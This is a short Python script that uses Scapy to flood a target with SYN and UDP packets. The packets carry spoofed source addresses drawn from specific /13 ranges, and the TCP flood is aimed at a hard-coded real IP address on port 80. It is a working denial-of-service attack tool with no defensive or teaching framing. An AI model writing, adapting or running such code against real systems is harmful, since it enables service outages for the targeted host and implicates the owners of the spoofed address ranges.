from scapy.all import *
import random
import threading
# 5.136.0.0/13, 95.24.0.0/13, 176.208.0.0/13, and 178.64.0.0/13
from scapy.layers.inet import IP, TCP, UDP


def tcp_flood(ip, port):
    ip_layer = IP(src=RandIP('5.136.0.0/13'), dst=ip)
    tcp_layer = TCP(sport=RandShort(), dport=port, flags='S')
    raw_data = Raw(b"X" * 1024)
    packet = ip_layer / tcp_layer / raw_data
    send(packet, loop=1, verbose=0)


def udp_flood(ip, port):
    i = 1
    ip_layer = IP(src=RandIP('5.136.0.0/13'), dst=ip)
    tcp_layer = UDP(sport=RandShort(), dport=port)
    raw_data = Raw(b"X" * 1024)
    packet = ip_layer / tcp_layer / raw_data
    send(packet, verbose=0)


if __name__ == '__main__':
    target_ip = '178.248.235.122'
    target_port = 80
    tcp_flood(target_ip, target_port)
